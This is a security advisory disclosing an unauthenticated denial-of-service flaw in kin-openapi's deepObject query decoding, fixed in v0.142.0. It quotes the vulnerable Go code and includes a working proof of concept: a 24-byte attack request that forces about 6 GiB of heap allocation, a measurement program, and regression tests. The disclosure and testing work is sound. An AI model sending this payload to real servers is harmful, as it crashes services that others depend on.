# [H] kin-openapi has uncontrolled resource consumption in openapi3filter deepObject query parameter decoding

## Summary
Severity: High
Advisory: GHSA-xhj3-7xw9-vr34
CVE: CVE-2026-77354
CWE: CWE-400, CWE-789
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-xhj3-7xw9-vr34
Type: github-advisory

## Affected
- Go: `github.com/getkin/kin-openapi` — affected >=0.124.0 <0.142.0

## Details
### Summary

An uncontrolled resource consumption vulnerability in `openapi3filter` lets any unauthenticated client force multi-gigabyte heap allocation with a single, tiny HTTP request. When a spec declares a `deepObject`-style query parameter whose schema contains an array (a normal, documented pattern), the decoder reconstructs the array by reading the **largest attacker-supplied index** and allocating one slot for every position from `0` up to that index — *before* schema validation (including `maxItems`) ever runs. A request as small as 24 bytes (`?param[items][50000000]=x`) drives heap allocation to **~6.1 GiB**, reliably triggering an OOM kill / restart loop on memory-constrained services.

### Details

The OpenAPI `style: deepObject` serialization lets clients express arrays in the query string using bracket notation, e.g. `param[items][0]=a&param[items][1]=b`. The decoder first collects these into an intermediate `map[string]any` keyed by the string of the index, then converts that sparse map into a real `[]any` in [`sliceMapToSlice`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L936):

```go
// req_resp_decoder.go (vulnerable version)
func sliceMapToSlice(m map[string]any) ([]any, error) {
	var result []any
	keys := make([]int, 0, len(m))
	for k := range m {
		key, err := strconv.Atoi(k)          // "50000000" -> 50000000, attacker-controlled
		if err != nil {
			return nil, fmt.Errorf("array indexes must be integers: %w", err)
		}
		keys = append(keys, key)
	}
	max := -1
	for _, k := range keys {
		if k > max {
			max = k                          // max = attacker's index, unbounded
		}
	}
	for i := 0; i <= max; i++ {              // <-- unbounded loop, 0 .. max
		val, ok := m[strconv.Itoa(i)]
		if !ok {
			result = append(result, nil)     // fills every sparse hole with nil
			continue
		}
		result = append(result, val)
	}
	return result, nil
}
```

A second, equally-sized allocation follows immediately in [`buildResObj`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L986):

```go
resultArr := make([]any /*not 0,*/, len(arr))   // second allocation, size = max+1
for i := range arr {
	r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items)
	...
}
```

So a single attacker-chosen integer `N` produces an `append`-grown `[]any` of length `N+1`, a second `make([]any, N+1)`, and `N+1` recursion steps — with **no upper bound** other than `strconv.Atoi`'s `int` range (~9.2×10¹⁸ on 64-bit) and available memory.

**Why `maxItems` does not help.** `maxItems` is enforced by schema *validation*, which runs strictly after parameter *decoding* completes. `sliceMapToSlice`/`buildResObj` fully materialize the oversized array first; validation only inspects — and rejects — the already-allocated result. The PoC below demonstrates this ordering directly: the returned error is the `maxItems` violation, proving the allocation happened before it could be prevented.

**Why this is deepObject-specific.** Every other array-bearing surface was driven with an equivalent large-index/large-array payload and stayed under ~27 KiB: `application/json` bodies build arrays element-by-element from the literal (no "index" concept to inflate); `x-www-form-urlencoded` and `multipart/form-data` arrays are sized by the number of repeated fields actually sent; and the other `makeObject` call sites (path/`simple`, header/`simple`, cookie/`form`, at [`:479`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L479), [`:777`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L777), [`:841`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L841)) build their intermediate map via `propsFromString`, which splits on delimiters and produces property-name keys, never bracketed integer indexes. Only the deepObject `propsFn` ([`:661-687`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L661)) synthesizes the bracketed integer keys that reach `sliceMapToSlice` with an attacker-controlled magnitude.

**Preconditions.** The target spec needs a query parameter with `in: query`, `style: deepObject` (typically `explode: true`), and a schema whose graph contains at least one `type: array`. This is an entirely normal, author-written spec — it is exactly the pattern the library's own decoder tests exercise. No hostile spec authoring is required, and the attack works regardless of any `maxItems` constraint on the array.

**Introduced in.** `sliceMapToSlice`, including the unbounded `0..max` fill loop, was added whole-cloth in commit [`78bb273`](https://github.com/getkin/kin-openapi/commit/78bb273e5892da3b0c8fc31857499449adfaba6c) ("openapi3filter: deepObject array of objects and array of arrays support (#923)", merged 2024-03-22), which first shipped in **`v0.124.0`**. Every tagged release from `v0.124.0` through the current `v0.141.0` / `master` (`1d0a337`) contains the vulnerable code path.

### PoC

Verified against revision `1d0a337c9b1570fab283be8a04c8af6e43b9a22c` (`v0.141.0`, current `master` at the time of writing), Go 1.25.0, `darwin/arm64`.

**1. Spec** — one operation accepting a `deepObject` query parameter whose `items` property is an array (`maxItems: 3` is declared deliberately, to prove it does not help):

```yaml
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /q:
    get:
      parameters:
        - name: param
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            properties:
              items:
                type: array
                maxItems: 3
                items: {type: string}
      responses:
        '200': {description: ok}
```

**2. Program** — build a request with a single huge array index and measure heap allocation across the same public entry point (`gorillamux` router → `openapi3filter.ValidateRequest`) any real HTTP server uses:

```go
package main

import (
	"context"
	"fmt"
	"net/http"
	"runtime"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const spec = `
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /q:
    get:
      parameters:
        - name: param
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            properties:
              items:
                type: array
                maxItems: 3
                items: {type: string}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, _ := loader.LoadFromData([]byte(spec))
	_ = doc.Validate(loader.Context)
	router, _ := gorillamux.NewRouter(doc)

	// Attacker-controlled index. A 24-byte query string is enough to force
	// materialization of a 50-million-element slice.
	const rawQuery = "param[items][50000000]=x"

	r, _ := http.NewRequest(http.MethodGet, "/q?"+rawQuery, nil)
	route, pp, _ := router.FindRoute(r)

	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)

	err := openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: r, PathParams: pp, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})

	runtime.ReadMemStats(&after)

	fmt.Printf("query string: %q (%d bytes)\n", rawQuery, len(rawQuery))
	fmt.Printf("heap allocated during ValidateRequest: %.1f MiB\n", float64(after.TotalAlloc-before.TotalAlloc)/(1<<20))
	fmt.Printf("ValidateRequest error: %v\n", err)
}
```

**3. Observed output** (`go run .`, unpatched tree, re-verified in this pass):

```
query string: "param[items][50000000]=x" (24 bytes)
heap allocated during ValidateRequest: 6231.1 MiB
ValidateRequest error: parameter "param" in query has an error: Error at "/items": maximum number of items is 3
```

A **24-byte query string drove ~6.1 GiB of heap allocation** in a single call, and the returned error is the `maxItems` rejection — proof that the array was fully materialized *before* validation could reject it. Scaling the index shows the amplification is linear and attacker-tunable (measured over several runs on this revision):

| Query string | Wire size | Heap allocated | Amplification |
|---|---|---|---|
| `param[items][10000]=x` | 21 B | 0.9 MiB | ~44,000× |
| `param[items][100000]=x` | 22 B | 11.1 MiB | ~529,000× |
| `param[items][1000000]=x` | 23 B | 114 MiB | ~5,200,000× |
| `param[items][5000000]=x` | 23 B | 555 MiB | ~25,300,000× |
| `param[items][50000000]=x` | 24 B | **6.1 GiB** | ~272,000,000× |

**Attack request** (nothing else required — no body, no auth, no unusual headers):

```
GET /whatever?param[items][50000000]=x HTTP/1.1
Host: victim
```

**Control (confirms only deepObject is a vector):** repeating the equivalent "large array" attempt against `application/json`, `application/x-www-form-urlencoded`, `multipart/form-data` bodies, and non-deepObject `path`/`header`/`cookie` styles stays under ~27 KiB in every case.

**4. Regression/scaling test suite** — a broader harness driving the same public entry point, adding the ordering proof (`TestC02_AllocationBeforeValidation`), the nested-index amplifier, and the cross-encoding controls referenced above. Save as `openapi3filter/zzz_c02_verify_test.go` and run with `C02_BIG=1 go test -run TestC02 ./openapi3filter/ -v` (unset `C02_BIG` to skip the two largest, slower indexes):

```go
package openapi3filter_test

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

// measureAlloc runs fn and reports the number of bytes of heap it caused to be
// allocated (TotalAlloc delta), which counts even memory that was already freed
// by the time fn returned. This captures transient allocation spikes.
func measureAlloc(fn func()) uint64 {
	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	fn()
	runtime.ReadMemStats(&after)
	return after.TotalAlloc - before.TotalAlloc
}

const c02Spec = `
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /q:
    get:
      parameters:
        - name: param
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            properties:
              items:
                type: array
                maxItems: 3
                items: {type: string}
      responses:
        '200': {description: ok}
`

func c02Router(t *testing.T) (*openapi3.T, func(rawquery string) error) {
	t.Helper()
	loader := openapi3.NewLoader()
	ctx := loader.Context
	doc, err := loader.LoadFromData([]byte(c02Spec))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(ctx))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	validate := func(rawquery string) error {
		req, err := http.NewRequest(http.MethodGet, "/q?"+rawquery, nil)
		require.NoError(t, err)
		route, pathParams, err := router.FindRoute(req)
		require.NoError(t, err)
		return openapi3filter.ValidateRequest(ctx, &openapi3filter.RequestValidationInput{
			Request:    req,
			PathParams: pathParams,
			Route:      route,
			Options:    &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
	}
	return doc, validate
}

// TestC02_Reproduce_MemoryExhaustion measures the allocation caused by a single
// tiny deepObject query with a large array index.
func TestC02_Reproduce_MemoryExhaustion(t *testing.T) {
	_, validate := c02Router(t)

	base := measureAlloc(func() {
		_ = validate("param[items][0]=a&param[items][1]=b&param[items][2]=c")
	})
	t.Logf("baseline (3 legit items): %s allocated", humanBytes(base))

	indexes := []int{10_000, 100_000, 1_000_000}
	if os.Getenv("C02_BIG") == "1" {
		indexes = append(indexes, 5_000_000, 50_000_000)
	}

	const fixThreshold = 32 << 20 // 32 MiB: no fixed-tree request should approach this
	worst := uint64(0)
	for _, idx := range indexes {
		q := fmt.Sprintf("param[items][%d]=x", idx)
		alloc := measureAlloc(func() {
			err := validate(q)
			require.Error(t, err) // rejected either by the cap (fixed) or maxItems (vuln)
		})
		if alloc > worst {
			worst = alloc
		}
		ratio := float64(alloc) / float64(len(q))
		t.Logf("index=%-10d query=%dB -> %s allocated (%.0fx over the query size)",
			idx, len(q), humanBytes(alloc), ratio)
	}
	require.Less(t, worst, uint64(fixThreshold),
		"C-02 REGRESSION: a tiny deepObject query allocated %s; the sliceMapToSlice cap is missing or too high",
		humanBytes(worst))
}

// TestC02_AllocationBeforeValidation checks the ordering: on the vulnerable
// tree the huge allocation happened even though maxItems:3 is declared, proving
// materialization precedes schema validation.
func TestC02_AllocationBeforeValidation(t *testing.T) {
	_, validate := c02Router(t)

	const idx = 2_000_000
	q := fmt.Sprintf("param[items][%d]=x", idx)

	var gotErr error
	alloc := measureAlloc(func() {
		gotErr = validate(q)
	})
	require.Error(t, gotErr)
	t.Logf("index=%d (query %d bytes) allocated %s; error: %v",
		idx, len(q), humanBytes(alloc), gotErr)

	// On the vulnerable tree this value was ~225 MiB and this assertion fails,
	// flagging the regression. On the fixed tree it stays well under 32 MiB.
	require.Less(t, alloc, uint64(32<<20),
		"C-02 REGRESSION: index %d allocated %s before rejection", idx, humanBytes(alloc))
}

// TestC02_OnlyDeepObjectAffected proves the blast radius: JSON, multipart, and
// urlencoded array handling do NOT go through sliceMapToSlice, so an equivalent
// "large index" payload in those encodings does not explode.
func TestC02_OnlyDeepObjectAffected(t *testing.T) {
	spec := `
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /b:
    post:
      requestBody:
        content:
          application/json:
            schema:
              type: object
              properties:
                items: {type: array, maxItems: 3, items: {type: string}}
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                items: {type: array, maxItems: 3, items: {type: string}}
          multipart/form-data:
            schema:
              type: object
              properties:
                items: {type: array, maxItems: 3, items: {type: string}}
      responses:
        '200': {description: ok}
`
	loader := openapi3.NewLoader()
	ctx := loader.Context
	doc, err := loader.LoadFromData([]byte(spec))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(ctx))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	do := func(ct, body string) (error, uint64) {
		var e error
		alloc := measureAlloc(func() {
			req, _ := http.NewRequest(http.MethodPost, "/b", strings.NewReader(body))
			req.Header.Set("Content-Type", ct)
			route, pathParams, rerr := router.FindRoute(req)
			require.NoError(t, rerr)
			e = openapi3filter.ValidateRequest(ctx, &openapi3filter.RequestValidationInput{
				Request: req, PathParams: pathParams, Route: route,
				Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
			})
		})
		return e, alloc
	}

	_, jsonAlloc := do("application/json", `{"items":["a","b","c","d"]}`)
	t.Logf("JSON 4-elem array: %s", humanBytes(jsonAlloc))
	require.Less(t, jsonAlloc, uint64(4<<20), "JSON path must not balloon")

	form := url.Values{}
	form.Set("items", "a")
	form.Add("items", "b")
	_, formAlloc := do("application/x-www-form-urlencoded", form.Encode())
	t.Logf("urlencoded repeated field: %s", humanBytes(formAlloc))
	require.Less(t, formAlloc, uint64(4<<20), "urlencoded path must not balloon")

	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	require.NoError(t, w.WriteField("items", "a"))
	require.NoError(t, w.WriteField("items", "b"))
	require.NoError(t, w.Close())
	_, mpAlloc := do(w.FormDataContentType(), buf.String())
	t.Logf("multipart fields: %s", humanBytes(mpAlloc))
	require.Less(t, mpAlloc, uint64(4<<20), "multipart path must not balloon")
}

// TestC02_NonDeepObjectStylesSafe checks the other makeObject entry points
// (path/simple, header/simple, cookie/form). These build props via
// propsFromString, whose keys are property names, not bracketed integer
// indexes -- so a big number lands as a string key that fails strconv.Atoi
// cleanly, without materializing a giant slice.
func TestC02_NonDeepObjectStylesSafe(t *testing.T) {
	spec := `
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /p/{param}:
    get:
      parameters:
        - name: param
          in: path
          required: true
          style: simple
          explode: false
          schema:
            type: object
            properties:
              items: {type: array, maxItems: 3, items: {type: string}}
      responses:
        '200': {description: ok}
`
	loader := openapi3.NewLoader()
	ctx := loader.Context
	doc, err := loader.LoadFromData([]byte(spec))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(ctx))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	alloc := measureAlloc(func() {
		req, _ := http.NewRequest(http.MethodGet, "/p/items,5000000", nil)
		route, pathParams, rerr := router.FindRoute(req)
		require.NoError(t, rerr)
		_ = openapi3filter.ValidateRequest(ctx, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
	})
	t.Logf("path/simple object with big scalar: %s", humanBytes(alloc))
	require.Less(t, alloc, uint64(4<<20), "path/simple must not balloon")
}

func humanBytes(b uint64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := uint64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(b)/float64(div), "KMGTPE"[exp])
}
```

**Observed output re-run in this pass** (`C02_BIG=1 go test -run TestC02 ./openapi3filter/ -v`):

- **Unpatched tree** (fix reverted via `git stash push -- openapi3filter/req_resp_decoder.go`): `TestC02_Reproduce_MemoryExhaustion` reproduced the full scaling table above (10,000 → 937.5 KiB through 50,000,000 → 6.1 GiB), and `TestC02_AllocationBeforeValidation` measured **225.2 MiB** allocated for `index=2,000,000` before the `maxItems` rejection fired — both matching the standalone PoC's findings and failing their bounded-allocation assertions as expected.
- **Patched tree** (fix restored): all five tests pass; the worst-case allocation across every index, including 50,000,000, drops to 51.1 KiB, and `TestC02_OnlyDeepObjectAffected` / `TestC02_NonDeepObjectStylesSafe` confirm the other encodings and parameter styles were never affected.

### Impact

- **Type:** Uncontrolled Resource Consumption (CWE-789, Memory Allocation with Excessive Size Value / CWE-400, Uncontrolled Resource Consumption) → **unauthenticated remote denial of service**.
- **Who is impacted:** any application using `github.com/getkin/kin-openapi/openapi3filter` to validate requests against a spec that declares an `in: query`, `style: deepObject` parameter whose schema contains an array anywhere in its property graph. This is a normal, documented OpenAPI pattern, not a hostile or unusual spec.
- **Attack:** a single unauthenticated `GET` request with a small, attacker-chosen query string (as few as ~21–24 bytes). No body, no credentials, no special client tooling, no chunked-encoding or `Content-Length` trickery — the trigger lives entirely in the query string, so request-body size limits do not mitigate it.
- **Consequence:** a single request can force hundreds of megabytes to multiple gigabytes of heap allocation; a handful of concurrent requests reliably exhausts memory on typical container limits (256 MB–2 GB), producing an OOM kill / restart loop. The declared `maxItems` constraint on the array does **not** prevent this, because materialization happens during decoding, strictly before schema validation runs.
- **Not affected:** specs that do not use `style: deepObject` for array-bearing query parameters; requests via `application/json`, `x-www-form-urlencoded`, or `multipart/form-data` bodies; and `path`/`header`/`cookie` styled object parameters (all verified empirically above, and re-verified in this pass).

## References
- https://github.com/getkin/kin-openapi/security/advisories/GHSA-xhj3-7xw9-vr34
- https://github.com/getkin/kin-openapi/commit/1223a0f215d2cf9beb2d9eb9ea2649d001c21388
- https://github.com/getkin/kin-openapi
- https://github.com/getkin/kin-openapi/releases/tag/v0.142.0
